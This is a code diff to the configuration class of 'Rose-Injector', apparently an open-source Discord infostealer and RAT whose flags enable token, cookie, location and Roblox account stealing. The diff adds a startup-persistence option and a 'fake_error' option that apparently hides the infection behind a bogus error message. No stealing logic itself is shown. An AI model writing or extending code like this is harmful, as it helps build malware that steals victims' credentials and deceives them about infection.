@@ -9,7 +9,6 @@ class Config:
         self.discord_rat_socket_link = 'DISCORD_RAT_SOCKET_LINK'
 
         self.discord_ping = False
-        self.startup = False
         self.injection = False
         self.token_stealing = False
         self.cookie_stealing = False
@@ -18,14 +17,13 @@ class Config:
         self.location_stealing = False
         self.roblox_stealing = False
         self.screenshot = False
-
+        self.start_up = False
+        self.fake_error = False
+        
         self.eb_color = 16711680
         self.eb_footer = 'Rose-Injector | Made by Gumbobrot, ICExFS, suegdu | https://github.com/DamagingRose/Rose-Injector'
         self.wh_avatar = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/readme/Rose.jpeg'
         self.wh_name = 'Rose-Injector'
-
-    def startup(self):
-        return self.startup
 
     def get_roblox_stealing(self):
         return self.roblox_stealing
@@ -80,3 +78,9 @@ class Config:
 
     def get_vm_detect_webhook(self):
         return self.vm_detect_webhook
+    
+    def get_start_up(self):
+        return self.start_up
+    
+    def get_fake_error(self):
+        return self.fake_error
